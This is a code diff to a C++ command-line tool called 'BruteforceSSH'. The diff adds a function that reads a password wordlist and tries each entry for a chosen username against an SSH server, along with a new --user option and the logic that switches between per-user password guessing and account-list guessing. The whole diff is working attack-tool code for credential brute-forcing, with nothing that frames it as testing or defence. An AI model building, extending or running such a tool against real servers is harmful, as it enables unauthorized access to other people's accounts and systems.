@@ -62,8 +62,31 @@ bool connect_accounts(const std::string &filename, const std::string &hostname, 
     return false;
 }
 
+bool connect_passwords(const std::string &filename, const std::string &username, const std::string &hostname, int port, int timeout) {
+    std::ifstream file(filename);
+    std::string line;
+
+    if (!file.is_open()) {
+        std::cerr << "Failed to open file: " << filename << std::endl;
+        return false;
+    }
+
+    while (std::getline(file, line)) {
+        std::istringstream iss(line);
+        std::string password;
+
+        if (std::getline(iss, password)) {
+            if (connect(hostname, port, username, password, timeout)) {
+                return true;
+            }
+        }
+    }
+    return false;
+}
+
 int main(int argc, char *argv[]) {
     std::string filename;
+    std::string username;
     std::string hostname = "localhost";
     int port = 22;
     int timeout = 30;
@@ -75,6 +98,13 @@ int main(int argc, char *argv[]) {
                 filename = argv[++i];
             } else {
                 std::cerr << "--file option requires a filename argument." << std::endl;
+                return 1;
+            }
+        } else if (arg == "-u" || arg == "--user") {
+            if (i + 1 < argc) {
+                username = argv[++i];
+            } else {
+                std::cerr << "--user option requires a username argument." << std::endl;
                 return 1;
             }
         } else if (arg == "-h" || arg == "--host") {
@@ -102,6 +132,7 @@ int main(int argc, char *argv[]) {
             std::cout << "Usage: BruteforceSSH [options]" << std::endl;
             std::cout << "Options:" << std::endl;
             std::cout << "  -f, --file <filename>      File" << std::endl;
+            std::cout << "  -u, --user <username>      User (optional)" << std::endl;
             std::cout << "  -h, --host <hostname>      Host (default: 127.0.0.1)" << std::endl;
             std::cout << "  -p, --port <port>          Port (default: 22)" << std::endl;
             std::cout << "  -t, --timeout <timeout>    Timeout (seconds, default: 30)" << std::endl;
@@ -114,9 +145,16 @@ int main(int argc, char *argv[]) {
     }
 
     if (!filename.empty()) {
-        if (!connect_accounts(filename, hostname, port, timeout)) {
-            std::cerr << "No successful authentication found." << std::endl;
-            return 1;
+        if (!username.empty()) {
+            if (!connect_passwords(filename, username, hostname, port, timeout)) {
+                std::cerr << "No successful authentication found." << std::endl;
+                return 1;
+            }
+        } else {
+            if (!connect_accounts(filename, hostname, port, timeout)) {
+                std::cerr << "No successful authentication found." << std::endl;
+                return 1;
+            }
         }
     } else {
         std::cerr << "You must specify a file." << std::endl;
